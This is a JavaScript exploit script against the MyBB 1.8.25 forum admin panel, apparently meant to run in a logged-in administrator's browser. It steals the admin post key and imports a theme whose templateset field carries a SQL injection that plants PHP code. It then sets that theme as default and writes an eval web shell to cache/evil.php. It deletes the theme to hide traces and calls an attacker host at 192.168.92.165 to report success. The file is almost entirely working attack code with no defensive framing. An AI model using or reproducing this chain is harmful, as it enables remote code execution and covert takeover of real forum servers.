var bashurl = 'http://192.168.92.164/mybb/mybb-mybb_1825'
var attack_url = 'http://192.168.92.165:8080/attack_success'
var my_post_key = ''
var source_theme = '';
var evil_theme_set = ''
var evil_theme_tid = ''

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function get_themes(){
	var url = bashurl + '/admin/index.php?module=style'

	var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function(){
        // readyState == 4说明请求已完成
        if(xhr.readyState==4){
            if(xhr.status==200 || xhr.status==304){
                var res = xhr.responseText;

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                var source_theme_tid = '';

                imgs = doc3.getElementsByTagName("img");

                for(var i=0;i<imgs.length;i++){
                	if(imgs[i].alt == 'Default Theme'){
                		source_theme_tid = imgs[i]
                		break
                	}
                }

                source_theme_tid = source_theme_tid.parentNode.nextElementSibling.firstElementChild.firstElementChild
                source_theme_tid = source_theme_tid.href.split('tid=')[1]

                //get my post key
                var postKey = doc3.getElementById('welcome').lastElementChild
                my_post_key = postKey.href.split('my_post_key=')[1]

                //reset url
                source_theme = bashurl + '/admin/index.php?module=style-themes&action=set_default&tid=' + source_theme_tid + '&my_post_key=' + my_post_key
            }
        }
    }
    xhr.send();
}

function import_xml(){
   	var formData = new FormData();
	var url = bashurl + '/admin/index.php?module=style-themes&action=import'

	formData.append("my_post_key", my_post_key);
	formData.append("import", 0);
	formData.append("url", "");
	formData.append("tid", "1");
	formData.append("name", "evilTheme1");
	formData.append("import_stylesheets", "1");
	formData.append("import_templates", "1");

	// JavaScript file-like object
	var content = [
		'<?xml version="1.0" encoding="UTF-8"?>',
		'<theme name="Default" version="1825">',
		'<properties>',
		'<templateset><![CDATA[999\') and 1=2 union select \'header_welcomeblock_member_user\',\'${file_put_contents($_GET[0],$_GET[1])};\' union select \'header_welcomeblock_member_admin\',\'${file_put_contents($_GET[0],$_GET[1])};\' union select \'header_welcomeblock_guest_login_modal\',\'${file_put_contents($_GET[0],$_GET[1])};\'#]]></templateset>',
		'<imgdir><![CDATA[images]]></imgdir>',
		'<logo><![CDATA[images/logo.png]]></logo>',
		'<tablespace><![CDATA[5]]></tablespace>',
		'<borderwidth><![CDATA[0]]></borderwidth>',
		'<editortheme><![CDATA[mybb.css]]></editortheme>',
		'<disporder></disporder>',
		'<colors></colors>',
		'</properties>',
		'<stylesheets>',
		'<stylesheet name="color_black.css" attachedto="black" version="1825">',
		'</stylesheet>',
		'</stylesheets>',
		'<templates>',
		'</templates>',
		'</theme>'
	].join('\n');


	var blob = new Blob([content], { type: "text/xml"});

	formData.append("local_file", blob);

	var request = new XMLHttpRequest();
	request.open("POST", url);
	request.send(formData);
}

function set_evil_theme(){
	var url = bashurl + '/admin/index.php?module=style'

	var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function(){
        // readyState == 4说明请求已完成
        if(xhr.readyState==4){
            if(xhr.status==200 || xhr.status==304){
                var res = xhr.responseText;
                var evil_theme = '';

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                aTag = doc3.getElementsByTagName("a")

 				for(var i=0;i<aTag.length;i++){
 					if(aTag[i].innerHTML == 'evilTheme1'){
 						evil_theme = aTag[i]
 						break
 					}
                }
                //get set url
            	evil_theme_set = evil_theme.parentNode.parentNode.previousElementSibling.firstElementChild.href
            	evil_theme_set = evil_theme_set.replace('index.php','admin/index.php')
            	console.log('evil_theme_set: ' + evil_theme_set)

                //get delete url
                evil_theme_tid = evil_theme.href.split('tid=')[1]
            	console.log('evil_theme_tid: ' + evil_theme_tid)
            }
        }
    }
    xhr.send();

    // set default thme
    var xhr2=new XMLHttpRequest();
    xhr2.open('GET',evil_theme_set,false);
    xhr2.send();
}

function trigger_rce(){
	// set default thme
    var xhr=new XMLHttpRequest();
    xhr.open('GET',bashurl + '/index.php?0=cache/evil.php&1=<?php eval($_GET[100]);?>',false);
    xhr.send();
}

function clean(){
	// reset default theme
    var xhr1=new XMLHttpRequest();
    xhr1.open('GET',source_theme,false);
    xhr1.send();


    var xhr2 = new XMLHttpRequest();
    var formData = new FormData();
	var url = bashurl + '/admin/index.php?module=style-themes&action=delete&tid=' + evil_theme_tid
	formData.append("my_post_key", my_post_key);
	xhr2.open("POST", url);
	xhr2.send(formData);
}

function notice_attack(){
 	var xhr1=new XMLHttpRequest();
    xhr1.open('GET',attack_url,false);
    xhr1.send();
}

get_themes()

if(my_post_key != ''){
	import_xml()

	sleep(300).then(() => {
	    set_evil_theme()
	    trigger_rce()
	    clean()
	    notice_attack()
	})
}